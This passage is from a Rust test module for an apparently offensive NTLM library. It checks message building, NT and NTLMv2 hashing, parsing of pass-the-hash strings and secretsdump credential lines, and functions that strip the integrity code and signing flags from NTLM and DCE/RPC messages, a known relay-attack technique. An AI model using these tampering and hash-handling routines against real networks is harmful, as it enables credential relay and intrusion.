            key_exchange: true,
            ..Default::default()
        };
        let out = build_authenticate_message_full(
            "LAINOSCP",
            "shannon",
            &nt_hash("GoldSeagull123"),
            &server_challenge,
            Some(target_info),
            NTLMSSP_CLIENT_FLAGS,
            NTLMSSP_CLIENT_FLAGS,
            &cfg,
        );
        let msg = &out.message;
        assert_eq!(u32::from_le_bytes([msg[8], msg[9], msg[10], msg[11]]), 3);

        let read_field = |off: usize| -> (usize, usize, usize) {
            let len = u16::from_le_bytes([msg[off], msg[off + 1]]) as usize;
            let offset =
                u32::from_le_bytes([msg[off + 4], msg[off + 5], msg[off + 6], msg[off + 7]])
                    as usize;
            (len, offset, offset + len)
        };
        // Fields are byte-packed and contiguous in the order they are declared:
        // LM(24) NT(16 proof + 48 blob) Domain(16) User(14) Workstation(0) Key(16).
        for (name, off, expect_len, expect_off) in [
            ("lm", 12, 24usize, 64usize),
            ("nt", 20, 64usize, 88usize),
            ("domain", 28, 16usize, 152usize),
            ("user", 36, 14usize, 168usize),
            ("workstation", 44, 0usize, 182usize),
            ("sessionkey", 52, 16usize, 182usize),
        ] {
            let (len, offset, end) = read_field(off);
            assert_eq!(len, expect_len, "{name} length");
            assert_eq!(offset, expect_off, "{name} offset");
            assert!(end <= msg.len(), "{name} payload runs past end of message");
        }
        assert_eq!(msg.len(), 198);

        // Verify the payload really is at those offsets.
        let (domain_len, domain_off, _) = read_field(28);
        let domain = String::from_utf16_lossy(
            &msg[domain_off..domain_off + domain_len]
                .chunks(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect::<Vec<_>>(),
        );
        assert_eq!(domain, "LAINOSCP");
        let (user_len, user_off, _) = read_field(36);
        let user = String::from_utf16_lossy(
            &msg[user_off..user_off + user_len]
                .chunks(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect::<Vec<_>>(),
        );
        assert_eq!(user, "shannon");
    }

    #[test]
    fn test_authenticate_key_exchange_roundtrip() {
        let server_challenge = [0xABu8; 8];
        let nt = nt_hash("GoldSeagull123");
        let cfg = NtlmAuthConfig {
            key_exchange: true,
            ..Default::default()
        };
        let out = build_authenticate_message_full(
            "LAINOSCP",
            "shannon",
            &nt,
            &server_challenge,
            None,
            NTLMSSP_CLIENT_FLAGS,
            NTLMSSP_CLIENT_FLAGS,
            &cfg,
        );

        // The exported session key is the random one we generated, and the
        // EncryptedRandomSessionKey field is RC4(KeyExchangeKey, exported).
        assert_ne!(out.exported_session_key, out.key_exchange_key);
        let enc =
            crate::crypto::rc4_util::rc4_crypt(&out.key_exchange_key, &out.exported_session_key);
        let key_off = u32::from_le_bytes([
            out.message[56],
            out.message[57],
            out.message[58],
            out.message[59],
        ]) as usize;
        assert_eq!(&out.message[key_off..key_off + 16], enc.as_slice());
    }

    #[test]
    fn test_authenticate_target_name_spn_from_dns_host() {
        let mut target_info = Vec::new();
        target_info.extend_from_slice(&MSV_AV_DNS_COMPUTER_NAME.to_le_bytes());
        let fqdn = "DC01.lainoscp.local"
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect::<Vec<u8>>();
        target_info.extend_from_slice(&(fqdn.len() as u16).to_le_bytes());
        target_info.extend_from_slice(&fqdn);
        target_info.extend_from_slice(&MSV_AV_EOL.to_le_bytes());
        target_info.extend_from_slice(&0u16.to_le_bytes());

        let cfg = NtlmAuthConfig {
            service: Some("ldap"),
            key_exchange: true,
            ..Default::default()
        };
        let out = build_authenticate_message_full(
            "LAINOSCP",
            "shannon",
            &nt_hash("x"),
            &[0u8; 8],
            Some(&target_info),
            NTLMSSP_CLIENT_FLAGS,
            NTLMSSP_CLIENT_FLAGS,
            &cfg,
        );
        let target_name = get_av_pair(&out.target_info, MSV_AV_TARGET_NAME).unwrap();
        let decoded = String::from_utf16_lossy(
            &target_name
                .chunks(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect::<Vec<_>>(),
        );
        assert_eq!(decoded, "ldap/DC01.lainoscp.local");
        // A fresh MsvAvTimestamp must be echoed back in the NTLMv2 blob.
        assert!(get_av_pair(&out.target_info, MSV_AV_TIMESTAMP).is_some());
    }

    #[test]
    fn test_authenticate_mic_is_hmac_over_three_messages() {
        let negotiate = build_negotiate_message_ex("LAINOSCP", true);
        let server_challenge = [0x5Au8; 8];
        // Minimal but structurally valid CHALLENGE message.
        let mut challenge = Vec::new();
        challenge.extend_from_slice(b"NTLMSSP\x00");
        challenge.extend_from_slice(&2u32.to_le_bytes());
        challenge.extend_from_slice(&[0u8; 8]);
        challenge.extend_from_slice(&NTLMSSP_CLIENT_FLAGS.to_le_bytes());
        challenge.extend_from_slice(&server_challenge);
        challenge.extend_from_slice(&[0u8; 8]);
        challenge.extend_from_slice(&[0u8; 8]);

        let cfg = NtlmAuthConfig {
            negotiate_message: Some(&negotiate),
            challenge_message: Some(&challenge),
            include_version: true,
            key_exchange: true,
            ..Default::default()
        };
        let out = build_authenticate_message_full(
            "LAINOSCP",
            "shannon",
            &nt_hash("GoldSeagull123"),
            &server_challenge,
            None,
            NTLMSSP_CLIENT_FLAGS,
            NTLMSSP_CLIENT_FLAGS,
            &cfg,
        );
        let mic = out
            .mic
            .expect("MIC must be present when Version is advertised");
        // MIC lives at 64 + 8 (Version) = 72.
        assert_eq!(&out.message[72..88], mic.as_slice());
        assert_eq!(&out.message[64..72], &NTLM_VERSION);

        // Recompute independently: the MIC is over NEGOTIATE || CHALLENGE || AUTH
        // with the MIC field zeroed.
        let mut zeroed = out.message.clone();
        zeroed[72..88].fill(0);
        let mut buf = Vec::new();
        buf.extend_from_slice(&negotiate);
        buf.extend_from_slice(&challenge);
        buf.extend_from_slice(&zeroed);
        assert_eq!(hmac_md5(&out.exported_session_key, &buf), mic);
    }

    // -- NT Hash ------------------------------------------

    #[test]
    fn test_nt_hash_known_value() {
        // Canonical NT hash for "password"
        // Reference: https://passlib.readthedocs.io/en/stable/lib/passlib.hash.nthash.html
        let hash = nt_hash_hex("password"); // Test vector
        assert_eq!(hash, "8846f7eaee8fb117ad06bdd830b7586c");
    }

    #[test]
    fn test_nt_hash_empty() {
        // Known NT hash for empty string -- universal "blank password" indicator
        let hash = nt_hash_hex("");
        assert_eq!(hash, "31d6cfe0d16ae931b73c59d7e0c089c0");
    }

    #[test]
    fn test_nt_hash_case_sensitive() {
        // NT hashes are case-sensitive: "password" ≠ "Password"
        let lower = nt_hash_hex("password"); // Test vector
        let upper = nt_hash_hex("Password");
        assert_ne!(lower, upper);
        assert_eq!(lower, "8846f7eaee8fb117ad06bdd830b7586c");
    }

    #[test]
    fn test_nt_hash_unicode() {
        // Verify UTF-16LE encoding handles multi-byte characters
        let hash = nt_hash("Übér");
        assert_eq!(hash.len(), 16);
    }

    // -- NTLMv2 Hash -------------------------------------

    #[test]
    fn test_ntlmv2_hash_deterministic() {
        let nt = nt_hash("password"); // Test vector
        let v2a = ntlmv2_hash(&nt, "admin", "CORP.LOCAL");
        let v2b = ntlmv2_hash(&nt, "admin", "CORP.LOCAL");
        assert_eq!(v2a, v2b);
        assert_eq!(v2a.len(), 16);
    }

    #[test]
    fn test_ntlmv2_hash_user_case_insensitive() {
        // MS-NLMP 3.3.2: only the user name is upper-cased.
        let nt = nt_hash("password"); // Test vector
        assert_eq!(
            ntlmv2_hash(&nt, "Admin", "CORP"),
            ntlmv2_hash(&nt, "ADMIN", "CORP")
        );
    }

    #[test]
    fn test_ntlmv2_hash_domain_case_sensitive() {
        // The user domain is used verbatim -- upper-casing it changes the key
        // and makes every NTLMv2 logon fail with rc=49.
        let nt = nt_hash("password"); // Test vector
        assert_ne!(
            ntlmv2_hash(&nt, "admin", "CORP"),
            ntlmv2_hash(&nt, "admin", "corp")
        );
    }

    #[test]
    fn test_ntlmv2_hash_matches_ms_nlmp_vector() {
        // MS-NLMP 4.2.4.1.1 -- NTOWFv2 for ("Password", "User", "Domain")
        let nt = nt_hash("Password");
        let v2 = ntlmv2_hash(&nt, "User", "Domain");
        assert_eq!(hex::encode(v2), "0c868a403bfd7a93a3001ef22ef02e3f");
    }

    #[test]
    fn test_ntlmv2_from_password_convenience() {
        let nt = nt_hash("test123");
        let expected = ntlmv2_hash(&nt, "jsmith", "CONTOSO.COM");
        let actual = ntlmv2_hash_from_password("test123", "jsmith", "CONTOSO.COM");
        assert_eq!(expected, actual);
    }

    // -- NTLMv2 Response ---------------------------------

    #[test]
    fn test_ntlmv2_response_format() {
        let nt = nt_hash("password"); // Test vector
        let v2 = ntlmv2_hash(&nt, "user", "DOMAIN");
        let server_challenge = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08];
        let client_challenge = [0xAA; 8];
        let blob = build_ntlmv2_client_blob(windows_filetime_now(), &client_challenge, &[]);
        let response = ntlmv2_response(&v2, &server_challenge, &blob);
        // Response = NTProofStr (16 bytes) + blob
        assert_eq!(response.len(), 16 + blob.len());
    }

    #[test]
    fn test_lmv2_response_length() {
        let nt = nt_hash("password"); // Test vector
        let v2 = ntlmv2_hash(&nt, "user", "DOMAIN");
        let sc = [0x11; 8];
        let cc = [0x22; 8];
        let resp = lmv2_response(&v2, &sc, &cc);
        // LMv2 response is always 24 bytes (16 proof + 8 client challenge)
        assert_eq!(resp.len(), 24);
    }

    // -- Session Key -------------------------------------

    #[test]
    fn test_session_base_key_length() {
        let nt = nt_hash("password"); // Test vector
        let v2 = ntlmv2_hash(&nt, "user", "DOMAIN");
        let fake_proof = [0xAA; 16];
        let key = ntlmv2_session_base_key(&v2, &fake_proof);
        assert_eq!(key.len(), 16);
    }

    // -- Client Blob -------------------------------------

    #[test]
    fn test_client_blob_structure() {
        let cc = [0xFF; 8];
        let target_info = b"\x02\x00\x0C\x00D\x00O\x00M\x00A\x00I\x00N";
        let blob = build_ntlmv2_client_blob(0x01D7_1B02_4C00_0000, &cc, target_info);

        assert_eq!(blob[0], 0x01); // RespType
        assert_eq!(blob[1], 0x01); // HiRespType
        // Bytes 2-3: Reserved1 (0)
        assert_eq!(&blob[2..4], &[0, 0]);
        // Bytes 4-7: Reserved2 (0)
        assert_eq!(&blob[4..8], &[0, 0, 0, 0]);
        // Bytes 8-15: Timestamp
        assert_eq!(blob.len(), 28 + target_info.len());
        // Bytes 16-23: ClientChallenge
        assert_eq!(&blob[16..24], &[0xFF; 8]);
    }

    // -- Filetime ----------------------------------------

    #[test]
    fn test_windows_filetime_reasonable() {
        let ft = windows_filetime_now();
        // Should be well past the year 2020 in FILETIME ticks
        // 2020-01-01 ≈ 132224352000000000
        assert!(ft > 132_224_352_000_000_000);
    }

    // -- Hash Parsing ------------------------------------

    #[test]
    fn test_parse_ntlm_hash_full() {
        let result = parse_ntlm_hash("aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c");
        assert!(result.is_ok());
        assert_eq!(result.unwrap().len(), 16);
    }

    #[test]
    fn test_parse_ntlm_hash_nt_only() {
        let result = parse_ntlm_hash("8846f7eaee8fb117ad06bdd830b7586c");
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), nt_hash("password")); // Test vector
    }

    #[test]
    fn test_parse_ntlm_hash_invalid() {
        let result = parse_ntlm_hash("not_a_valid_hash");
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_ntlm_hash_wrong_length() {
        let result = parse_ntlm_hash("aabbccdd");
        assert!(result.is_err());
    }

    // -- Secretsdump Parsing -----------------------------

    #[test]
    fn test_parse_secretsdump_line() {
        let line = "Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::";
        let (user, rid, hash) = parse_secretsdump_line(line).unwrap();
        assert_eq!(user, "Administrator");
        assert_eq!(rid, 500);
        assert_eq!(hash, nt_hash("password")); // Test vector
    }

    #[test]
    fn test_parse_secretsdump_invalid() {
        assert!(parse_secretsdump_line("garbage").is_err());
    }

    // -- Empty Hash Checks -------------------------------

    #[test]
    fn test_is_empty_nt_hash() {
        let empty = nt_hash("");
        assert!(is_empty_nt_hash(&empty));
        assert!(!is_empty_nt_hash(&nt_hash("password"))); // Test vector
    }

    #[test]
    fn test_is_empty_lm_hash() {
        let empty = lm_hash_empty();
        assert!(is_empty_lm_hash(&empty));
        assert!(!is_empty_lm_hash(&[0u8; 16]));
    }

    // -- strip_mic_from_type3 --------------------------

    // Constants for NTLM signing flags (duplicated here for test scope)
    const TEST_NEG_SIGN: u32 = 0x0000_0010;
    const TEST_NEG_SEAL: u32 = 0x0000_0020;
    const TEST_NEG_ALWAYS_SIGN: u32 = 0x0000_8000;

    /// Build a minimal NTLM Type 3 message with NTLMv2 response containing AV_PAIRs and a MIC.
    fn build_type3_with_mic() -> Vec<u8> {
        let nt_proof = [0xAA; 16];
        let client_challenge = [0xBB; 8];
        let timestamp: u64 = 0x01D7_1B02_4C00_0000;

        let mut av_pairs = Vec::new();
        // MsvAvNbDomainName: AvId=1, AvLen=10, Data="CORP\0" (UTF-16LE)
        av_pairs.extend_from_slice(&[0x01, 0x00, 0x0A, 0x00]);
        av_pairs.extend_from_slice(b"C\x00O\x00R\x00P\x00\x00\x00");
        // MsvAvFlags: AvId=6, AvLen=4, Data=0x00000001 (MIC present)
        av_pairs.extend_from_slice(&[0x06, 0x00, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00]);
        av_pairs.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // EOL
        let mic = [0xCC; 16];

        let mut client_blob = Vec::with_capacity(28 + av_pairs.len() + 16);
        client_blob.push(0x01);
        client_blob.push(0x01);
        client_blob.extend_from_slice(&[0u8; 2]);
        client_blob.extend_from_slice(&[0u8; 4]);
        client_blob.extend_from_slice(&timestamp.to_le_bytes());
        client_blob.extend_from_slice(&client_challenge);
        client_blob.extend_from_slice(&[0u8; 4]);
        client_blob.extend_from_slice(&av_pairs);
        client_blob.extend_from_slice(&mic);

        let nt_resp: Vec<u8> = [&nt_proof[..], &client_blob].concat();

        let nt_resp_offset: u32 = 64;
        let nt_resp_len = nt_resp.len() as u16;

        let mut msg = Vec::with_capacity(64 + nt_resp.len());
        msg.extend_from_slice(b"NTLMSSP\x00");
        msg.extend_from_slice(&3u32.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u32.to_le_bytes());
        msg.extend_from_slice(&nt_resp_len.to_le_bytes());
        msg.extend_from_slice(&nt_resp_len.to_le_bytes());
        msg.extend_from_slice(&nt_resp_offset.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u32.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u32.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u32.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u32.to_le_bytes());
        let flags = TEST_NEG_SIGN | TEST_NEG_SEAL | TEST_NEG_ALWAYS_SIGN;
        msg.extend_from_slice(&flags.to_le_bytes());
        msg.extend_from_slice(&nt_resp);
        msg
    }

    fn build_type3_without_mic() -> Vec<u8> {
        let nt_proof = [0xAA; 16];
        let client_challenge = [0xBB; 8];
        let timestamp: u64 = 0x01D7_1B02_4C00_0000;

        let mut av_pairs = Vec::new();
        // MsvAvNbDomainName: AvId=1, AvLen=10, Data="CORP\0"
        av_pairs.extend_from_slice(&[0x01, 0x00, 0x0A, 0x00]);
        av_pairs.extend_from_slice(b"C\x00O\x00R\x00P\x00\x00\x00");
        av_pairs.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // EOL

        let mut client_blob = Vec::with_capacity(28 + av_pairs.len());
        client_blob.push(0x01);
        client_blob.push(0x01);
        client_blob.extend_from_slice(&[0u8; 2]);
        client_blob.extend_from_slice(&[0u8; 4]);
        client_blob.extend_from_slice(&timestamp.to_le_bytes());
        client_blob.extend_from_slice(&client_challenge);
        client_blob.extend_from_slice(&[0u8; 4]);
        client_blob.extend_from_slice(&av_pairs);

        let nt_resp: Vec<u8> = [&nt_proof[..], &client_blob].concat();
        let nt_resp_offset: u32 = 64;
        let nt_resp_len = nt_resp.len() as u16;

        let mut msg = Vec::with_capacity(64 + nt_resp.len());
        msg.extend_from_slice(b"NTLMSSP\x00");
        msg.extend_from_slice(&3u32.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u32.to_le_bytes());
        msg.extend_from_slice(&nt_resp_len.to_le_bytes());
        msg.extend_from_slice(&nt_resp_len.to_le_bytes());
        msg.extend_from_slice(&nt_resp_offset.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u32.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u32.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u32.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u32.to_le_bytes());
        let flags = TEST_NEG_SIGN | TEST_NEG_SEAL;
        msg.extend_from_slice(&flags.to_le_bytes());
        msg.extend_from_slice(&nt_resp);
        msg
    }

    #[test]
    fn test_strip_mic_clears_flags() {
        let msg = build_type3_with_mic();
        let result = strip_mic_from_type3(&msg);

        let flags = u32::from_le_bytes([result[60], result[61], result[62], result[63]]);
        assert_eq!(flags & TEST_NEG_SIGN, 0, "SIGN flag should be cleared");
        assert_eq!(flags & TEST_NEG_SEAL, 0, "SEAL flag should be cleared");
        assert_eq!(
            flags & TEST_NEG_ALWAYS_SIGN,
            0,
            "ALWAYS_SIGN flag should be cleared"
        );
    }

    #[test]
    fn test_strip_mic_clears_mic_present_bit() {
        let msg = build_type3_with_mic();
        let result = strip_mic_from_type3(&msg);

        let nt_resp_off = u32::from_le_bytes([msg[24], msg[25], msg[26], msg[27]]) as usize;
        let nt_resp_len = u16::from_le_bytes([msg[20], msg[21]]) as usize;
        let av_pairs_start = 16 + 28;
        let av_pairs = &result[nt_resp_off + av_pairs_start..nt_resp_off + nt_resp_len];
        let mut i = 0;
        while i + 4 <= av_pairs.len() {
            let av_id = u16::from_le_bytes([av_pairs[i], av_pairs[i + 1]]);
            let av_len = u16::from_le_bytes([av_pairs[i + 2], av_pairs[i + 3]]) as usize;
            if av_id == 6 && av_len >= 4 {
                assert_eq!(
                    av_pairs[i + 4] & 0x01,
                    0,
                    "MIC-present bit should be cleared"
                );
                return;
            }
            if av_id == 0 {
                break;
            }
            i += 4 + av_len;
        }
        panic!("MsvAvFlags AV_PAIR not found in result");
    }

    #[test]
    fn test_strip_mic_zeroes_mic_bytes() {
        let msg = build_type3_with_mic();
        let result = strip_mic_from_type3(&msg);

        let nt_resp_off = u32::from_le_bytes([msg[24], msg[25], msg[26], msg[27]]) as usize;
        let nt_resp_len = u16::from_le_bytes([msg[20], msg[21]]) as usize;
        let av_pairs_start = 16 + 28;
        let av_pairs = &result[nt_resp_off + av_pairs_start..nt_resp_off + nt_resp_len];
        let mut i = 0;
        while i + 4 <= av_pairs.len() {
            let av_id = u16::from_le_bytes([av_pairs[i], av_pairs[i + 1]]);
            let av_len = u16::from_le_bytes([av_pairs[i + 2], av_pairs[i + 3]]) as usize;
            if av_id == 0 {
                break;
            }
            i += 4 + av_len;
        }
        let eol_end = av_pairs_start + i + 4;
        let mic_start = nt_resp_off + eol_end;

        for j in 0..16 {
            assert_eq!(result[mic_start + j], 0, "MIC byte {j} should be zeroed");
        }
    }

    #[test]
    fn test_strip_mic_preserves_other_av_pairs() {
        let msg = build_type3_with_mic();
        let result = strip_mic_from_type3(&msg);

        let nt_resp_off = u32::from_le_bytes([msg[24], msg[25], msg[26], msg[27]]) as usize;
        let av_pairs_start = 16 + 28;
        let av_pairs = &result[nt_resp_off + av_pairs_start..];

        let av_id = u16::from_le_bytes([av_pairs[0], av_pairs[1]]);
        assert_eq!(av_id, 1, "First AV_PAIR should be preserved");
        assert_eq!(
            &av_pairs[4..8],
            b"C\x00O\x00",
            "AV_PAIR value should be preserved"
        );
    }

    #[test]
    fn test_strip_mic_no_mic_present() {
        let msg = build_type3_without_mic();
        let result = strip_mic_from_type3(&msg);

        let flags = u32::from_le_bytes([result[60], result[61], result[62], result[63]]);
        assert_eq!(flags & TEST_NEG_SIGN, 0);
        assert_eq!(flags & TEST_NEG_SEAL, 0);

        assert!(result.len() >= 64 + 16 + 28);
        assert_eq!(&result[0..8], b"NTLMSSP\x00");
    }

    #[test]
    fn test_strip_mic_short_message_returns_original() {
        let data = [0u8; 30];
        let result = strip_mic_from_type3(&data);
        assert_eq!(result, data.to_vec());
    }

    #[test]
    fn test_strip_mic_wrong_signature_returns_original() {
        let mut data = vec![0u8; 64];
        data[0..8].copy_from_slice(b"NOTNTLM\x00");
        data[8..12].copy_from_slice(&3u32.to_le_bytes());
        let result = strip_mic_from_type3(&data);
        assert_eq!(result, data);
    }

    #[test]
    fn test_strip_mic_wrong_type_returns_original() {
        let mut data = vec![0u8; 64];
        data[0..8].copy_from_slice(b"NTLMSSP\x00");
        data[8..12].copy_from_slice(&2u32.to_le_bytes());
        let result = strip_mic_from_type3(&data);
        assert_eq!(result, data);
    }

    #[test]
    fn test_strip_mic_preserves_non_sign_flags() {
        let mut msg = build_type3_with_mic();
        let extra_flags = 0x0000_0001 | 0x0000_0002 | 0x0000_0004;
        let orig = u32::from_le_bytes([msg[60], msg[61], msg[62], msg[63]]);
        msg[60..64].copy_from_slice(&(orig | extra_flags).to_le_bytes());

        let result = strip_mic_from_type3(&msg);

        let flags = u32::from_le_bytes([result[60], result[61], result[62], result[63]]);
        assert_eq!(
            flags & extra_flags,
            extra_flags,
            "Non-sign flags should be preserved"
        );
        assert_eq!(
            flags & (TEST_NEG_SIGN | TEST_NEG_SEAL | TEST_NEG_ALWAYS_SIGN),
            0
        );
    }

    #[test]
    fn test_strip_mic_bad_nt_resp_offset_does_not_panic() {
        let mut msg = build_type3_with_mic();
        msg[24..28].copy_from_slice(&9999u32.to_le_bytes());
        let result = strip_mic_from_type3(&msg);

        let flags = u32::from_le_bytes([result[60], result[61], result[62], result[63]]);
        assert_eq!(flags & TEST_NEG_SIGN, 0);
    }

    #[test]
    fn test_strip_mic_multiple_av_pairs_with_mic_last() {
        let nt_proof = [0xAA; 16];
        let client_challenge = [0xBB; 8];
        let timestamp: u64 = 0x01D7_1B02_4C00_0000;

        let mut av_pairs = Vec::new();
        // MsvAvNbDomainName: AvId=1, AvLen=10, Data="CORP\0"
        av_pairs.extend_from_slice(&[0x01, 0x00, 0x0A, 0x00]);
        av_pairs.extend_from_slice(b"C\x00O\x00R\x00P\x00\x00\x00");
        // MsvAvNbTreeName: AvId=3, AvLen=10, Data="CORP\0"
        av_pairs.extend_from_slice(&[0x03, 0x00, 0x0A, 0x00]);
        av_pairs.extend_from_slice(b"C\x00O\x00R\x00P\x00\x00\x00");
        // MsvAvNbComputerName: AvId=5, AvLen=14, Data="WS2025\0"
        av_pairs.extend_from_slice(&[0x05, 0x00, 0x0E, 0x00]);
        av_pairs.extend_from_slice(b"W\x00S\x002\x000\x002\x005\x00\x00\x00");
        // MsvAvFlags: AvId=6, AvLen=4, Data=MIC_PRESENT=1
        av_pairs.extend_from_slice(&[0x06, 0x00, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00]);
        // MsvAvTimestamp: AvId=7, AvLen=8, Data=0 (8 bytes of zeros)
        av_pairs.extend_from_slice(&[
            0x07, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ]);
        av_pairs.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // EOL

        let mic = [0xDD; 16];

        let mut client_blob = Vec::with_capacity(28 + av_pairs.len() + 16);
        client_blob.push(0x01);
        client_blob.push(0x01);
        client_blob.extend_from_slice(&[0u8; 2]);
        client_blob.extend_from_slice(&[0u8; 4]);
        client_blob.extend_from_slice(&timestamp.to_le_bytes());
        client_blob.extend_from_slice(&client_challenge);
        client_blob.extend_from_slice(&[0u8; 4]);
        client_blob.extend_from_slice(&av_pairs);
        client_blob.extend_from_slice(&mic);

        let nt_resp: Vec<u8> = [&nt_proof[..], &client_blob].concat();
        let nt_resp_offset: u32 = 64;
        let nt_resp_len = nt_resp.len() as u16;

        let mut msg = Vec::with_capacity(64 + nt_resp.len());
        msg.extend_from_slice(b"NTLMSSP\x00");
        msg.extend_from_slice(&3u32.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u32.to_le_bytes());
        msg.extend_from_slice(&nt_resp_len.to_le_bytes());
        msg.extend_from_slice(&nt_resp_len.to_le_bytes());
        msg.extend_from_slice(&nt_resp_offset.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u32.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u32.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u32.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        msg.extend_from_slice(&0u32.to_le_bytes());
        let flags = TEST_NEG_SIGN | TEST_NEG_SEAL | TEST_NEG_ALWAYS_SIGN;
        msg.extend_from_slice(&flags.to_le_bytes());
        msg.extend_from_slice(&nt_resp);

        let result = strip_mic_from_type3(&msg);

        let nt_off = u32::from_le_bytes([msg[24], msg[25], msg[26], msg[27]]) as usize;
        let av_sizes = [
            4 + 10, // NbDomain: header(4)+data(10)
            4 + 10, // NbTree: header(4)+data(10)
            4 + 14, // NbComputer: header(4)+data(14)
            4 + 4,  // MsvAvFlags: header(4)+data(4)
            4 + 8,  // Timestamp: header(4)+data(8)
        ];
        let av_total: usize = av_sizes.iter().sum();
        let expected_mic_start = nt_off + 16 + 28 + av_total + 4; // +4 for EOL
        for j in 0..16 {
            assert_eq!(
                result[expected_mic_start + j],
                0,
                "MIC byte {j} should be zeroed"
            );
        }

        assert_eq!(
            &result[nt_off + 16 + 28 + 4..nt_off + 16 + 28 + 8],
            b"C\x00O\x00"
        );
    }

    // ===========================================================
    // strip_dce_rpc_signature Tests
    // ===========================================================

    fn build_dce_rpc_request_with_auth() -> Vec<u8> {
        let stub_data = vec![0xAA; 40];
        let auth_sig = vec![0xBB; 16];

        let mut pdu = Vec::new();
        pdu.extend_from_slice(&[0x05, 0x00]);
        pdu.push(0x00);
        pdu.push(0x03);
        pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);
        let stub_len = stub_data.len();
        let auth_len = 8 + auth_sig.len();
        let frag_len = 24 + stub_len + auth_len;
        pdu.extend_from_slice(&(frag_len as u16).to_le_bytes());
        pdu.extend_from_slice(&(auth_len as u16).to_le_bytes());
        pdu.extend_from_slice(&1u32.to_le_bytes());
        pdu.extend_from_slice(&(stub_len as u32).to_le_bytes());
        pdu.extend_from_slice(&0u16.to_le_bytes());
        pdu.extend_from_slice(&0u16.to_le_bytes());
        pdu.extend_from_slice(&stub_data);
        pdu.push(0x00);
        pdu.push(0x0A);
        pdu.push(0x05);
        pdu.push(0x00);
        pdu.extend_from_slice(&0u32.to_le_bytes());
        pdu.extend_from_slice(&auth_sig);

        pdu
    }

    fn build_dce_rpc_request_without_auth() -> Vec<u8> {
        let stub_data = vec![0xAA; 40];
        let mut pdu = Vec::new();

        pdu.extend_from_slice(&[0x05, 0x00]);
        pdu.push(0x00);
        pdu.push(0x03);
        pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);
        let frag_len = 24 + stub_data.len();
        pdu.extend_from_slice(&(frag_len as u16).to_le_bytes());
        pdu.extend_from_slice(&0u16.to_le_bytes());
        pdu.extend_from_slice(&1u32.to_le_bytes());
        pdu.extend_from_slice(&(stub_data.len() as u32).to_le_bytes());
        pdu.extend_from_slice(&0u16.to_le_bytes());
        pdu.extend_from_slice(&0u16.to_le_bytes());
        pdu.extend_from_slice(&stub_data);

        pdu
    }

    #[test]
    fn test_strip_dce_rpc_clears_signature() {
        let msg = build_dce_rpc_request_with_auth();
        let result = strip_dce_rpc_signature(&msg);

        let auth_len = u16::from_le_bytes([result[10], result[11]]);
        assert_eq!(auth_len, 0, "Auth length should be zeroed");

        let orig_frag = u16::from_le_bytes([msg[8], msg[9]]);
        let new_frag = u16::from_le_bytes([result[8], result[9]]);
        assert!(new_frag < orig_frag, "Fragment length should be reduced");
        assert_eq!(
            new_frag as usize,
            orig_frag as usize - 24,
            "Should remove auth verifier"
        );

        // The signature is at the end of the original PDU, but after stripping it should be zeroed
        // Original: 24 (header) + 40 (stub) + 8 (auth header) + 16 (sig) = 88 bytes
        // After: 24 (header) + 40 (stub) = 64 bytes
        // Signature was at offset 72..88 in original (24 + 40 + 8)
        let orig_sig_start = 24 + 40 + 8;
        for i in 0..16 {
            assert_eq!(
                result[orig_sig_start + i],
                0,
                "Signature byte {i} should be zeroed"
            );
        }
    }

    #[test]
